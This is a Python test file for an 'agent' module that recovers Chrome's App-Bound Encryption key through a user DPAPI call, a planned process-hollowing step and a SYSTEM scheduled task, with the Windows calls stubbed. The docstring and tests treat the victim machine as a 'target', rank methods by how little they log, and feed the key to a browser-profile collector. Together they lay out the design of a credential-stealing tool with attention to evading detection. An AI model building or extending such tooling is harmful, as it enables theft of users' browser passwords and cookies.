"""The three ABE rungs, tested where they are separable.

The plan's acceptance is stated as "the three paths are separable in tests with the OS calls
stubbed", and that is exactly what this file does: every Windows call is replaced, so each
rung can be made to succeed or fail on its own and the dispatcher's behaviour is the only
thing under test.

What is worth pinning, and why:

1. **Order.** The plan lists the rungs hollow, SYSTEM, DPAPI — the order they were invented
   in. The order a run should try them is by what the target has to give up: ``user`` opens
   nothing and writes nothing, ``hollow`` spawns a browser and can crash it, ``system`` logs a
   task creation. A run that can finish on the cheapest rung must, so the ordering is a
   contract, not a preference.
2. **The trail.** "No key" is several different facts and only some of them are faults. The
   record carries one line per rung, and a run on Brave that says ``user`` should read
   differently from a run on current Chrome that says ``system``.
3. **The key never goes in the record.** A record that says *how* is intelligence. A record
   that says *what* is a credential in a text file, next to a state file that survives the run.
4. **Teardown.** The task and the workspace come back whether the rung worked or not. A failed
   unwrap that leaves a SYSTEM task registered has left a persistent artifact behind.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent import abe  # noqa: E402

KEY = b"\x11" * 32
OTHER = b"\x22" * 32

# A user-scoped DPAPI blob as Chrome hands it back after the SYSTEM round trip: the magic is
# the only marker, and the prefix text is the older shape. Both are real fixtures in the
# sense that the review path is the one that runs.
MAGIC = bytes.fromhex("01000000d08c9ddf0115d1118c7a00c04fc297eb")


@pytest.fixture()
def record(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Point the record at a scratch directory and return the file it will write."""
    monkeypatch.setattr(abe.util, "queue_root", lambda: tmp_path / "state")
    return tmp_path / "state" / abe.RECORD_FILE


def read_record(record: Path) -> dict:
    import json

    return json.loads(record.read_text(encoding="utf-8"))


@pytest.fixture()
def no_windows(monkeypatch: pytest.MonkeyPatch) -> None:
    """Every rung fails at the OS boundary, so the dispatcher's own behaviour is visible."""
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: None)
    monkeypatch.setattr(abe, "_register_task", lambda task, command: False)
    monkeypatch.setattr(abe, "_run_task", lambda task: False)
    monkeypatch.setattr(abe, "_await_result", lambda result: None)
    monkeypatch.setattr(abe, "_delete_task", lambda task: True)
    monkeypatch.setattr(abe, "_workspace", lambda: _scratch())


def _scratch() -> Path:
    import tempfile

    return Path(tempfile.mkdtemp(prefix="s-test-"))


# --- order --------------------------------------------------------------------


def test_the_rungs_are_ordered_by_what_they_cost_the_target() -> None:
    assert abe.RUNGS == (abe.RUNG_USER, abe.RUNG_HOLLOW, abe.RUNG_SYSTEM)
    # Named separately so the reason survives a refactor: the in-process rung must come
    # before the one that logs a task creation.
    assert abe.RUNGS.index(abe.RUNG_USER) < abe.RUNGS.index(abe.RUNG_SYSTEM)
    assert abe.RUNGS.index(abe.RUNG_HOLLOW) < abe.RUNGS.index(abe.RUNG_SYSTEM)


def test_every_rung_has_a_runner() -> None:
    assert set(abe._RUNNERS) == set(abe.RUNGS)


# --- the cheap rung -----------------------------------------------------------


def test_the_user_rung_wins_and_no_task_is_registered(
    record: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: KEY)

    def refuse(task: str, command: str) -> bool:
        pytest.fail("the cheapest rung won and the SYSTEM path still ran")

    monkeypatch.setattr(abe, "_register_task", refuse)

    result = abe.unwrap(b"blob")
    assert result is not None
    assert result.key == KEY
    assert result.path == abe.RUNG_USER
    assert [attempt.rung for attempt in result.attempts] == [abe.RUNG_USER]


def test_the_user_rung_unwraps_a_prefixed_blob(record: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The older shape: the plaintext is ``DPAPI`` plus another blob under this user."""
    monkeypatch.setattr(
        abe.winapi, "crypt_unprotect", lambda blob: b"DPAPI" + blob if blob else None
    )
    # First call returns the wrapper, the second returns the key.
    calls: list[bytes] = []

    def unprotect(blob: bytes) -> bytes | None:
        calls.append(blob)
        return b"DPAPI" + blob if len(calls) == 1 else KEY

    monkeypatch.setattr(abe.winapi, "crypt_unprotect", unprotect)

    result = abe.unwrap(b"wrapped")
    assert result is not None and result.path == abe.RUNG_USER
    assert result.key == KEY
    assert calls[-1] == b"wrapped"


def test_the_user_rung_accepts_a_bare_key(record: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Version drift: some builds hand back the 32 bytes with no wrapper at all."""
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: KEY)
    result = abe.unwrap(b"x")
    assert result is not None and result.key == KEY


# --- the middle rung ----------------------------------------------------------


def test_the_hollow_rung_reports_why_it_was_skipped(record: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The rung is a policy slot, and the record says so rather than staying silent."""
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: None)
    monkeypatch.setattr(abe, "_register_task", lambda task, command: False)
    monkeypatch.setattr(abe, "_workspace", lambda: _scratch())

    result = abe.unwrap(b"blob")
    assert result is None
    hollow = [a for a in read_record(record)["attempts"] if a["rung"] == abe.RUNG_HOLLOW]
    assert hollow and hollow[0]["ok"] is False
    assert "not shipped" in hollow[0]["detail"]


# --- the SYSTEM rung ----------------------------------------------------------


def test_the_system_rung_wins_when_the_cheap_one_cannot(record: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: None)
    monkeypatch.setattr(abe, "_workspace", _scratch)
    monkeypatch.setattr(abe, "_command_line", lambda workspace: "short")
    monkeypatch.setattr(abe, "_register_task", lambda task, command: True)
    monkeypatch.setattr(abe, "_run_task", lambda task: True)
    monkeypatch.setattr(abe, "_delete_task", lambda task: True)
    monkeypatch.setattr(abe, "_await_result", lambda result: b"DPAPI" + MAGIC)

    calls: list[bytes] = []

    def unprotect(blob: bytes) -> bytes | None:
        calls.append(blob)
        # The SYSTEM plaintext is a user-scoped DPAPI blob; opening it yields the key.
        return KEY if blob.startswith(MAGIC) else None

    monkeypatch.setattr(abe.winapi, "crypt_unprotect", unprotect)

    result = abe.unwrap(b"blob")
    assert result is not None
    assert result.path == abe.RUNG_SYSTEM
    assert result.key == KEY
    assert [attempt.rung for attempt in result.attempts] == [
        abe.RUNG_USER,
        abe.RUNG_HOLLOW,
        abe.RUNG_SYSTEM,
    ]
    assert [attempt.ok for attempt in result.attempts] == [False, False, True]


def test_the_system_rung_cleans_up_when_the_task_never_runs(
    record: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A failed unwrap must not leave a SYSTEM task registered behind it."""
    workspace = _scratch()
    deleted: list[str] = []

    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: None)
    monkeypatch.setattr(abe, "_workspace", lambda: workspace)
    monkeypatch.setattr(abe, "_command_line", lambda path: "short")
    monkeypatch.setattr(abe, "_register_task", lambda task, command: True)
    monkeypatch.setattr(abe, "_run_task", lambda task: False)
    monkeypatch.setattr(abe, "_delete_task", lambda task: deleted.append(task) or True)

    result = abe.unwrap(b"blob")
    assert result is None
    assert deleted, "the task was registered and never deleted"
    assert not workspace.exists(), "the workspace outlived the run"

    system = [a for a in read_record(record)["attempts"] if a["rung"] == abe.RUNG_SYSTEM]
    assert system and "not started" in system[0]["detail"]


def test_a_command_line_over_the_cap_is_refused_before_schtasks(
    record: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Registering anyway fails inside schtasks with a message about the option."""
    deleted: list[str] = []

    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: None)
    monkeypatch.setattr(abe, "_workspace", _scratch)
    monkeypatch.setattr(abe, "_command_line", lambda path: "x" * (abe._MAX_COMMAND + 1))
    monkeypatch.setattr(
        abe, "_register_task", lambda task, command: pytest.fail("registered an oversized line")
    )
    monkeypatch.setattr(abe, "_delete_task", lambda task: deleted.append(task) or True)

    result = abe.unwrap(b"blob")
    assert result is None
    system = [a for a in read_record(record)["attempts"] if a["rung"] == abe.RUNG_SYSTEM]
    assert system and str(abe._MAX_COMMAND) in system[0]["detail"]


# --- nothing worked -----------------------------------------------------------


def test_every_rung_is_recorded_when_none_of_them_work(record: Path, no_windows: None) -> None:
    result = abe.unwrap(b"blob")
    assert result is None

    document = read_record(record)
    assert document["path"] is None
    assert [a["rung"] for a in document["attempts"]] == list(abe.RUNGS)
    assert all(a["ok"] is False for a in document["attempts"])
    assert all(a["detail"] for a in document["attempts"]), "a rung failed without saying why"


def test_the_record_never_carries_the_key(record: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """The one thing that must not be in a text file next to the state."""
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: KEY)
    abe.unwrap(b"blob")

    raw = record.read_bytes()
    assert KEY not in raw
    assert KEY.hex().encode() not in raw
    assert not raw.replace(b'"path"', b"").count(b"\x11"), "key bytes leaked into the record"


def test_the_record_is_written_beside_the_state(record: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: KEY)
    abe.unwrap(b"blob")
    assert record.is_file()
    assert record.parent.name == "state"


def test_an_empty_blob_is_not_attempted(record: Path) -> None:
    assert abe.unwrap(b"") is None
    assert not record.exists(), "an empty blob wrote a record about nothing"


def test_a_failed_record_is_not_an_exception(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Losing the note about a key is a lost observation, not a lost collection."""

    def explode() -> Path:
        raise OSError("no state directory")

    monkeypatch.setattr(abe.util, "queue_root", explode)
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: KEY)

    result = abe.unwrap(b"blob")
    assert result is not None and result.key == KEY


# --- the reduction ------------------------------------------------------------


@pytest.mark.parametrize(
    ("plaintext", "expected"),
    [
        (KEY, KEY),
        (b"DPAPI" + KEY, None),
        (MAGIC, KEY),
        (b"\x00" * 31, None),
        (b"\x00" * 33, None),
        (b"", None),
    ],
)
def test_reduce_only_accepts_shapes_it_can_name(
    plaintext: bytes, expected: bytes | None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """``_reduce`` never guesses at a length: 32 bytes bare, or a blob it can open."""
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: KEY if blob == MAGIC else None)
    assert abe._reduce(plaintext) == expected


def test_reduce_returns_none_for_none() -> None:
    assert abe._reduce(None) is None


def test_strip_prefix_refuses_a_short_value() -> None:
    assert abe.strip_prefix(b"APPBrest", b"APPB") == b"rest"
    assert abe.strip_prefix(b"APP", b"APPB") is None
    assert abe.strip_prefix(b"", b"APPB") is None


# --- the helper ---------------------------------------------------------------


def test_the_helper_writes_hex_and_removes_its_task(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    deleted: list[str] = []
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: b"SYSTEM-PLAINTEXT")
    monkeypatch.setattr(abe, "_delete_task", lambda task: deleted.append(task) or True)

    (tmp_path / "in.bin").write_bytes(b"sealed")
    code = abe.helper_main(["--abe-unwrap", str(tmp_path)])
    assert code == 0
    assert (tmp_path / "out.hex").read_text(encoding="ascii") == b"SYSTEM-PLAINTEXT".hex()
    assert deleted, "the helper left its one-shot task behind"


def test_the_helper_refuses_a_workspace_it_cannot_read(tmp_path: Path) -> None:
    assert abe.helper_main(["--abe-unwrap", str(tmp_path / "missing")]) == 3


def test_the_helper_refuses_an_oversized_blob(tmp_path: Path) -> None:
    (tmp_path / "in.bin").write_bytes(b"\x00" * (abe._MAX_HELPER_BLOB + 1))
    assert abe.helper_main(["--abe-unwrap", str(tmp_path)]) == 3


def test_the_helper_refuses_the_wrong_argument_count() -> None:
    assert abe.helper_main(["--abe-unwrap"]) == 2
    assert abe.helper_main(["--abe-unwrap", "a", "b"]) == 2


def test_the_helper_reports_a_failed_unwrap(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(abe.winapi, "crypt_unprotect", lambda blob: None)
    (tmp_path / "in.bin").write_bytes(b"sealed")
    assert abe.helper_main(["--abe-unwrap", str(tmp_path)]) == 4


# --- the caller ---------------------------------------------------------------


def test_the_browser_source_uses_the_path_and_not_the_key(
    record: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """``_app_bound_key`` wants the 32 bytes and the rung; both are cached together."""
    from agent.sources.browsers import chromium

    monkeypatch.setattr(abe, "unwrap", lambda blob: abe.Unwrap(OTHER, abe.RUNG_SYSTEM, ()))
    monkeypatch.setattr("agent.sources.browsers.chromium.abe", abe)
    chromium._APP_BOUND_CACHE.clear()

    import base64

    blob = base64.b64encode(b"APPBsealed").decode("ascii")
    key, path = chromium._app_bound_key({"app_bound_encrypted_key": blob}, "cache-key")
    assert key == OTHER
    assert path == abe.RUNG_SYSTEM
    assert chromium._APP_BOUND_CACHE["cache-key"] == (OTHER, abe.RUNG_SYSTEM)


def test_the_profile_record_carries_abe_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """``abe_path`` is the fact that turns "app_bound: false" into a diagnosis."""
    from agent.sources.browsers import chromium

    monkeypatch.setattr(
        chromium,
        "profile_keys",
        lambda profile: chromium.Keys(user=b"\x01" * 32, app_bound=None, path=abe.RUNG_SYSTEM),
    )
    target = tmp_path / "browser"
    target.mkdir()
    # A profile with no databases at all still writes its status, which is where the rung
    # is reported.
    profile = tmp_path / "Default"
    profile.mkdir()
    chromium.run_profile(profile, target)

    import json

    documents = [
        json.loads(path.read_text(encoding="utf-8"))
        for path in target.rglob("*.json")
    ]
    assert any(
        document.get("keys", {}).get("path") == abe.RUNG_SYSTEM
        for document in documents
        if isinstance(document.get("keys"), dict)
    ), documents

